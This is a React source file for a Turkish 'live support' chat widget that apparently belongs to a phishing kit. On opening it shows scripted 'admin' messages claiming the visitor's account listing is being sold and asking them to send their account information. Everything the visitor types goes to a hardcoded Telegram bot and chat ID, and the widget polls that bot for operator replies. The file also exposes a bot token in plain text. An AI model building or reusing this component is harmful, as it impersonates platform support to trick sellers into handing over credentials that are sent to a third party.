import React, { useState, useEffect, useRef } from 'react';
import { MessageSquare, X, Send, User } from 'lucide-react';

interface ChatMessage {
  text: string;
  sender: 'user' | 'admin';
  timestamp: string;
}

export const ChatWidget: React.FC = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [userId, setUserId] = useState<string>('');
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [inputValue, setInputValue] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const lastUpdateIdRef = useRef(0);
  const sessionStartTime = useRef(Math.floor(Date.now() / 1000));

  useEffect(() => {
    if (isOpen) {
      localStorage.setItem('support_popup_resolved', 'true');
      window.dispatchEvent(new CustomEvent('chatWasOpened')); // Notify popup to close
    }
  }, [isOpen]);

  useEffect(() => {
    // Generate or retrieve anonymous user ID
    let storedUserId = localStorage.getItem('anon_chat_id');
    if (!storedUserId) {
      storedUserId = `Anon_${Math.floor(Math.random() * 10000)}`;
      localStorage.setItem('anon_chat_id', storedUserId);
    }
    setUserId(storedUserId);

    // Load local chat history
    const storedHistory = localStorage.getItem('chat_history');
    if (storedHistory) {
      try {
        setMessages(JSON.parse(storedHistory));
      } catch (e) {
        console.error('Failed to parse chat history');
      }
    } else {
      // Default welcome message
      setMessages([
        {
          text: 'Merhaba! Destek ekibine hoş geldiniz.',
          sender: 'admin',
          timestamp: new Date().toISOString(),
        },
      ]);
    }

    const handleOpenChat = (e: any) => {
      setIsOpen(true);

      const storedHistory = localStorage.getItem('chat_history');
      let historyLength = 0;
      if (storedHistory) {
        try {
          const parsed = JSON.parse(storedHistory);
          historyLength = parsed.length;
        } catch (err) {}
      }

      // Only trigger the automated sequence if there is no real conversation history
      if (historyLength <= 1) {
        // Dynamically get listing title: passed event detail, or local storage, or fallback to default profile listing
        const defaultListing = localStorage.getItem('active_listing_title') || "Dolu Sağlam Hesap Mail Değişimli Pazarlık Olur.";
        const title = e.detail?.title || defaultListing;

        // Clear initial default message to cleanly start the 3-message sequence
        setMessages([]);
        
        setTimeout(() => {
          setMessages([{
            text: 'Merhaba! Destek ekibine hoş geldiniz.',
            sender: 'admin',
            timestamp: new Date().toISOString()
          }]);
        }, 400);

        setTimeout(() => {
          setMessages(prev => [...prev, {
            text: `${title} adlı ilanınızın satış işlemi başlatılmıştır.`,
            sender: 'admin',
            timestamp: new Date().toISOString()
          }]);
        }, 1500);

        setTimeout(() => {
          setMessages(prev => [...prev, {
            text: "lütfen işleme devam etmek için hesap bilgilerini iletiniz.",
            sender: 'admin',
            timestamp: new Date().toISOString()
          }]);
        }, 3000);
      }
    };

    window.addEventListener('openChat', handleOpenChat);
    return () => window.removeEventListener('openChat', handleOpenChat);
  }, []);

  useEffect(() => {
    // Save messages to local storage whenever they change
    if (messages.length > 0) {
      localStorage.setItem('chat_history', JSON.stringify(messages));
    }
    scrollToBottom();
  }, [messages]);

  // Polling for new messages
  useEffect(() => {
    if (!userId || !isOpen) return;

    const pollMessages = async () => {
      try {
        const token = '8655258410:AAG6eodH98W_N_efElBatfVsNZr8mZ6oDuE';
        const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
        const data = await res.json();
        
        if (data.ok && data.result) {
          data.result.forEach((update: any) => {
            const msg = update.message;
            if (msg && msg.text && update.update_id > lastUpdateIdRef.current) {
              lastUpdateIdRef.current = Math.max(lastUpdateIdRef.current, update.update_id);
              
              if (msg.date < sessionStartTime.current) return; // Skip old messages
              
              let isForMe = false;
              let replyText = null;
              
              if (msg.reply_to_message && msg.reply_to_message.text) {
                const match = msg.reply_to_message.text.match(/^#([^:]+):/);
                if (match && match[1] === userId) {
                  isForMe = true;
                  replyText = msg.text;
                }
              }
              
              if (!isForMe) {
                const manualMatch = msg.text.match(/^#([^:]+):\s*(.*)/);
                if (manualMatch && manualMatch[1] === userId) {
                  isForMe = true;
                  replyText = manualMatch[2];
                }
              }
              
              if (isForMe && replyText) {
                setMessages(prev => [...prev, {
                  text: replyText as string,
                  sender: 'admin',
                  timestamp: new Date(msg.date * 1000).toISOString()
                }]);
              }
            }
          });
        }
      } catch (err) {
        console.error('Polling error:', err);
      }
    };

    const interval = setInterval(pollMessages, 3000);
    return () => clearInterval(interval);
  }, [userId, isOpen]);

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  const handleSendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputValue.trim() || !userId) return;

    const newMsg: ChatMessage = {
      text: inputValue.trim(),
      sender: 'user',
      timestamp: new Date().toISOString(),
    };

    setMessages(prev => [...prev, newMsg]);
    setInputValue('');
    setIsTyping(true);

    try {
      const token = '8655258410:AAG6eodH98W_N_efElBatfVsNZr8mZ6oDuE';
      const chatId = '2046691604';
      const text = `#${userId}: ${newMsg.text}`;
      
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text })
      });
    } catch (err) {
      console.error('Failed to send message:', err);
    } finally {
      setIsTyping(false);
    }
  };

  if (!isOpen) {
    return (
      <>
        <style>{`
          @keyframes pulseScaleChat {
            0%, 100% { transform: scale(1); box-shadow: 0 4px 20px rgba(0,230,118,0.4); }
            50% { transform: scale(1.08); box-shadow: 0 4px 30px rgba(0,230,118,0.8); }
          }
        `}</style>
        <button
          onClick={() => {
            if (messages.length <= 1) {
              const defaultListing = localStorage.getItem('active_listing_title') || "Dolu Sağlam Hesap Mail Değişimli Pazarlık Olur.";
              window.dispatchEvent(new CustomEvent('openChat', { detail: { title: defaultListing } }));
            } else {
              setIsOpen(true);
            }
          }}
          className="fixed z-[99] bottom-24 right-4 md:bottom-[162px] md:right-10 w-14 h-14 bg-[#00e676] text-[#111017] flex items-center justify-center rounded-full hover:bg-[#00c853] transition-all duration-300 animate-[pulseScaleChat_2s_ease-in-out_infinite]"
        >
          <MessageSquare className="w-6 h-6" fill="currentColor" />
        </button>
      </>
    );
  }

  return (
    <div className="fixed z-[99] bottom-24 right-4 md:bottom-[162px] md:right-10 w-[350px] max-w-[calc(100vw-3rem)] h-[500px] max-h-[calc(100vh-3rem)] bg-[#1a1c24] rounded-2xl shadow-2xl flex flex-col border border-slate-800 overflow-hidden animate-in slide-in-from-bottom-5">
      {/* Header */}
      <div className="bg-[#00e676] px-4 py-3 flex items-center justify-between text-[#111017]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center overflow-hidden shrink-0">
            <img src="https://i.ibb.co/prX2HcWM/images.png" alt="Agent Avatar" className="w-full h-full object-cover" />
          </div>
          <div>
            <h3 className="font-bold text-sm">Canlı Destek</h3>
            <p className="text-[10px] font-medium opacity-80">Aktif</p>
          </div>
        </div>
        <button 
          onClick={() => setIsOpen(false)}
          className="p-2 hover:bg-black/10 rounded-xl transition-colors"
        >
          <X className="w-5 h-5" />
        </button>
      </div>

      {/* Chat Area */}
      <div className="flex-1 p-4 overflow-y-auto space-y-4 bg-[#141724]">
        {messages.map((msg, idx) => (
          <div 
            key={idx} 
            className={`flex flex-col ${msg.sender === 'user' ? 'items-end' : 'items-start'} animate-in fade-in`}
          >
            <div 
              className={`px-4 py-2.5 rounded-2xl text-sm max-w-[85%] ${
                msg.sender === 'user' 
                  ? 'bg-[#00e676] text-[#111017] rounded-tr-none' 
                  : 'bg-[#252836] text-slate-200 border border-slate-700 rounded-tl-none'
              }`}
            >
              {msg.text}
            </div>
            <span className="text-[10px] text-slate-500 mt-1 mx-1">
              {new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
            </span>
          </div>
        ))}
        {isTyping && (
          <div className="flex items-start">
            <div className="bg-[#252836] border border-slate-700 px-4 py-3 rounded-2xl rounded-tl-none flex gap-1">
              <span className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce"></span>
              <span className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></span>
              <span className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: '0.4s' }}></span>
            </div>
          </div>
        )}
        <div ref={messagesEndRef} />
      </div>

      {/* Input Area */}
      <div className="p-3 bg-[#1a1c24] border-t border-slate-800">
        <form onSubmit={handleSendMessage} className="flex items-center gap-2">
          <input 
            type="text" 
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            placeholder="Mesajınızı yazın..." 
            className="flex-1 bg-[#252836] border border-slate-700 text-white text-sm rounded-xl px-4 py-3 focus:outline-none focus:border-[#00e676]"
          />
          <button 
            type="submit"
            disabled={!inputValue.trim()}
            className="bg-[#00e676] text-[#111017] p-3 rounded-xl hover:bg-[#00c853] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <Send className="w-5 h-5" />
          </button>
        </form>
      </div>
    </div>
  );
};
